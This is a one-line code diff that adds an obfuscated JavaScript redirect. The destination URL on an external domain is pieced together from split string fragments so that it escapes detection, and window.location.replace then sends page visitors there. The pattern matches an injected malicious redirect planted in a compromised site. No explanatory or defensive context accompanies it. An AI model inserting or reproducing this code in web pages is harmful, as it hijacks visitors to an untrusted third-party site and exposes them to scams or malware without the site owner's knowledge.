@@ -1,0 +1,1 @@
+window.location.replace(``.concat(`htt`,`p://orn`,`ewz.com/r`,`d/c3395`,`9ZsKqn0U`,`KrY12qfQ0`,`SWnl267`))
